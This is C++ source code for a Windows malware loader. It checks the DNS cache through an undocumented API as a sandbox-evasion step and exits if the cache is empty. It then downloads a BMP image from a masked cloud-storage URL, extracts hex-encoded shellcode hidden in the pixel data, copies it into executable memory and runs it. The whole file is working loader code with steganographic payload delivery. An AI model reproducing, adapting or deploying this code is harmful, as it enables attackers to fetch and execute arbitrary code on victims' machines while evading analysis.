#include <stdio.h>
#include <Windows.h>
#include <Winhttp.h>
#include <WinDNS.h>
#include <iterator>
#include <iostream>
#include <windows.h>
#include <WinDNS.h>
#include <string>
#include <vector>

#pragma comment(lib,"Winhttp.lib")
#pragma comment(lib,"urlmon.lib")



using namespace std;

struct CachedDnsRecord
{
	wstring name;
	int type;
};

#define INET_ADDRSTRLEN     22
#define INET6_ADDRSTRLEN    65


typedef void(*DownLoadCallback)(int ContentSize, int CUR_LEN);

typedef struct _URL_INFO
{
	WCHAR szScheme[512];
	WCHAR szHostName[512];
	WCHAR szUserName[512];
	WCHAR szPassword[512];
	WCHAR szUrlPath[512];
	WCHAR szExtraInfo[512];
}URL_INFO, *PURL_INFO;




void dcallback(int ContentSize, int file_size)
{
	//printf("count:%d,size:%d\n", ContentSize, file_size);
}

void download(const wchar_t *Url, const wchar_t *FileName, DownLoadCallback Func)
{
	URL_INFO url_info = { 0 };
	URL_COMPONENTSW lpUrlComponents = { 0 };
	lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
	lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo;
	lpUrlComponents.lpszHostName = url_info.szHostName;
	lpUrlComponents.lpszPassword = url_info.szPassword;
	lpUrlComponents.lpszScheme = url_info.szScheme;
	lpUrlComponents.lpszUrlPath = url_info.szUrlPath;
	lpUrlComponents.lpszUserName = url_info.szUserName;

	lpUrlComponents.dwExtraInfoLength =
		lpUrlComponents.dwHostNameLength =
		lpUrlComponents.dwPasswordLength =
		lpUrlComponents.dwSchemeLength =
		lpUrlComponents.dwUrlPathLength =
		lpUrlComponents.dwUserNameLength = 512;

	WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &lpUrlComponents);

	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
	DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;
	HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"HEAD", lpUrlComponents.lpszUrlPath, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSizeDW, &dwIndex);
	WinHttpCloseHandle(hRequest);

	hRequest = WinHttpOpenRequest(hConnect, L"GET", lpUrlComponents.lpszUrlPath, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);

	BYTE *pBuffer = NULL;
	pBuffer = new BYTE[dwContentSize];
	ZeroMemory(pBuffer, dwContentSize);
	do {
		WinHttpReadData(hRequest, pBuffer, dwContentSize, &dwReadBytes);
		Func(dwContentSize, dwReadBytes);
	} while (dwReadBytes == 0);
	//cout << pBuffer << endl;
	BITMAPFILEHEADER *pHdr = (BITMAPFILEHEADER *)pBuffer;
	LPBYTE pStr = pBuffer + pHdr->bfOffBits + 3;
	char szTmp[1900];
	RtlZeroMemory(szTmp, 1900);
	for (int i = 0; i < 1900; i++)
	{
		if (*pStr == 0 || *pStr == 0xFF)
		{
			break;
		}
		szTmp[i] = *pStr;
		pStr += 4;
	}
	//printf_s(szTmp);

	unsigned int char_in_hex;

	unsigned int iterations = strlen(szTmp);


	unsigned int memory_allocation = strlen(szTmp) / 2;

	VirtualProtect(szTmp, memory_allocation, PAGE_READWRITE, 0);

	for (unsigned int i = 0; i < iterations / 2; i++) {
		sscanf_s(szTmp + 2 * i, "%2X", &char_in_hex);
		szTmp[i] = (char)char_in_hex;
	}


	void* abvc = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
	memcpy(abvc, szTmp, memory_allocation);
	DWORD ignore;
	VirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &ignore);

	(*(void(*)()) abvc)();
	delete pBuffer;
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

}


typedef struct _DNS_CACHE_ENTRY
{
	struct _DNS_CACHE_ENTRY* pNext; // Pointer to next entry
	PWSTR pszName; // DNS Record Name
	unsigned short wType; // DNS Record Type
	unsigned short wDataLength; // Not referenced
	unsigned long dwFlags; // DNS Record Flags
} DNSCACHEENTRY, *PDNSCACHEENTRY;

typedef int(WINAPI *DNS_GET_CACHE_DATA_TABLE)(PDNSCACHEENTRY);

vector<CachedDnsRecord> getDnsCache()
{
	vector<CachedDnsRecord> results;

	PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY));
	HINSTANCE hLib = LoadLibrary(TEXT("DNSAPI.dll"));
	DNS_GET_CACHE_DATA_TABLE DnsGetCacheDataTable =
		(DNS_GET_CACHE_DATA_TABLE)GetProcAddress(hLib, "DnsGetCacheDataTable");

	int stat = DnsGetCacheDataTable(pEntry);
	pEntry = pEntry->pNext;
	while (pEntry)
	{
		CachedDnsRecord record;
		record.name = wstring(pEntry->pszName);
		record.type = pEntry->wType;
		results.push_back(record);
		pEntry = pEntry->pNext;
	}
	free(pEntry);
	if (!results.empty())
	{
		download(L"https://xxxx.oss-cn-beijing.aliyuncs.com:80/xxx.bmp", L"1633Music", &dcallback);
	}
	else
	{
		exit(0);
	}
	return results;
}


int main()
{
	auto cache = getDnsCache();
	return 0;
}